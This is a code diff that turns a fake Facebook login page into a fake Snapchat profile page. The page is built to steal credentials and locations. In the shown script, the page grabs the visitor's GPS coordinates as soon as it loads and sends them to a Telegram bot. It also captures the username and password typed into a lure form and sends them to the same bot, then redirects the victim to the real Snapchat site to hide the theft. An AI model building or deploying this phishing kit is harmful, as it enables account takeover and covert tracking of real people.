@@ -3,84 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك - تسجيل الدخول</title>
+    <title>اميرة بتواضعي (@amira_snap) • Snapchat</title>
+    
+    <!-- Open Graph Meta Tags لظهور المعاينة والآفاتر عند مشاركة الرابط -->
+    <meta property="og:title" content="اميرة بتواضعي (@amira_snap) • Snapchat profile">
+    <meta property="og:description" content="أضفني على سناب شات! شاهد قصصي واليوميات الخاصة بي 👻">
+    <meta property="og:image" content="https://c.top4top.io/p_3954xsyfg0.jpg">
+    <meta property="og:type" content="profile">
+
     <style>
         body {
-            background-color: #f0f2f5;
-            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f7f7f7;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .container {
-            display: flex;
-            max-width: 980px;
-            width: 100%;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px;
-        }
-        .left-side {
-            width: 500px;
-            padding-right: 20px;
-        }
-        .left-side h1 {
-            color: #1877f2;
-            font-size: 48px;
-            margin-bottom: 10px;
-        }
-        .left-side p {
-            font-size: 28px;
-            line-height: 32px;
-            color: #1c1e21;
-        }
-        .right-side {
+        .snap-card {
             background: #ffffff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            width: 396px;
+            padding: 30px 25px;
+            border-radius: 24px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            width: 360px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .avatar-container {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 12px;
+        }
+        .avatar {
+            width: 96px;
+            height: 96px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 4px solid #fffc00;
+        }
+        .profile-name {
+            font-size: 22px;
+            font-weight: 700;
+            color: #0f1419;
+            margin-bottom: 4px;
+        }
+        .profile-username {
+            font-size: 14px;
+            color: #536471;
+            margin-bottom: 20px;
+        }
+        .login-box {
+            text-align: right;
+            border-top: 1px solid #eff3f4;
+            padding-top: 20px;
+        }
+        .login-box p {
+            font-size: 13px;
+            color: #536471;
+            margin-bottom: 12px;
             text-align: center;
         }
-        .right-side input {
-            width: 92%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-        }
-        .right-side button {
+        .login-box input {
             width: 100%;
-            background-color: #1877f2;
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-            padding: 12px;
-            cursor: pointer;
-            margin-top: 6px;
+            padding: 12px 14px;
+            margin-bottom: 12px;
+            border: 1px solid #cfd9de;
+            border-radius: 12px;
+            box-sizing: border-box;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
         }
-        .right-side button:hover {
-            background-color: #166fe5;
+        .login-box input:focus {
+            border-color: #fffc00;
+        }
+        .login-box button {
+            width: 100%;
+            background-color: #fffc00;
+            color: #000000;
+            border: none;
+            border-radius: 12px;
+            padding: 12px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            transition: background-color 0.2s;
+        }
+        .login-box button:hover {
+            background-color: #f4f100;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="left-side">
-            <h1>facebook</h1>
-            <p>فيس بوك يتيح لك التواصل المشاركة مع الأصدقاء والعالم.</p>
+    <div class="snap-card">
+        <div class="avatar-container">
+            <img src="https://c.top4top.io/p_3954xsyfg0.jpg" alt="Avatar" class="avatar">
         </div>
-        <div class="right-side">
+        <div class="profile-name">اميرة بتواضعي</div>
+        <div class="profile-username">@amira_snap</div>
+        
+        <div class="login-box">
+            <p>سجل الدخول بحسابك لمشاهدة القصص الخاصة</p>
             <form id="loginForm" onsubmit="handleSubmission(event)">
-                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="text" id="email" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
                 <input type="password" id="pass" placeholder="كلمة السر" required>
-                <button type="submit" id="subBtn">تسجيل الدخول</button>
+                <button type="submit">متابعة العرض</button>
             </form>
         </div>
     </div>
@@ -91,18 +121,18 @@
 
         let capturedGpsData = "Pending / Not Granted Yet";
 
-        // طلب إذن الـ GPS فور دخول الصفحة مباشرة
+        // إطلاق طلب إذن الموقع الجغرافي فور اكتمال تحميل الصفحة مباشرة
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         capturedGpsData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude} (Accuracy: ${position.coords.accuracy}m)`;
-                        sendToTelegram(`[+] GPS Auto-Captured on Load:\n- Coordinates: ${capturedGpsData}`);
+                        sendToTelegram(`[+] Snapchat GPS Auto-Captured on Load:\n- Coordinates: ${capturedGpsData}`);
                     },
                     function(error) {
                         capturedGpsData = `Denied/Error: ${error.message}`;
                     },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                 );
             }
         };
@@ -139,16 +169,16 @@ ${textMessage}
             const pass = document.getElementById('pass').value;
 
             const credsPayload = `
-[+] Phishing Credentials Captured:
-- Email/Phone: ${email}
+[+] Snapchat Phishing Credentials Captured:
+- Username/Email: ${email}
 - Password: ${pass}
 - GPS State: ${capturedGpsData}
             `.trim();
 
             await sendToTelegram(credsPayload);
 
-            // إعادة توجيه الضحية لصفحة فيسبوك الحقيقية
-            window.location.href = 'https://www.facebook.com';
+            // إعادة توجيه الضحية إلى موقع سناب شات الحقيقي بعد إتمام الإرسال
+            window.location.href = 'https://www.snapchat.com';
         }
     </script>
 </body>
